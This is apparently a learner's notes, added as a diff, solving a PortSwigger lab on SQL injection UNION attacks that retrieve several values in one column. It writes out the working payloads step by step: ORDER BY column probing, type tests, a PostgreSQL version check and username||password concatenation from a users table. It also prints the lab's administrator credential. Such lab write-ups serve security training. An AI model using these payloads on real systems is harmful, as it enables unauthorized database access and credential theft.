@@ -1,0 +1,38 @@
+Lab: SQL injection UNION attack, retrieving multiple values in a single column
+
+GOAL: retrive all username and password in a single column and log in as administrator 
+
+
+Analysis
+
+' to check the vulnerability
+
+find the columns
+'order by 1--  not showed in page
+'order by 2-- showed in page
+'order by 3-- error
+so column number = 3-1  =  2
+
+find column type
+ 'union select 'a',null--  internal server error
+'union select null,'a'--  ok
+
+output data from other table
+'union select null, username from users--
+'union select null, password from users--
+
+we need to see in one output not different output
+using demo https://portswigger.net/web-security/sql-injection/cheat-sheet
+check which database using 
+
+'union select null,@@version--  error
+'union select null,version()--  found the used one postgreSQL
+
+so follow the rule of concatenation
+
+'union select null,username||'~'|| password from users--
+administrator~yjbp1rj421sbifg0penb
+
+login and solved
+
+
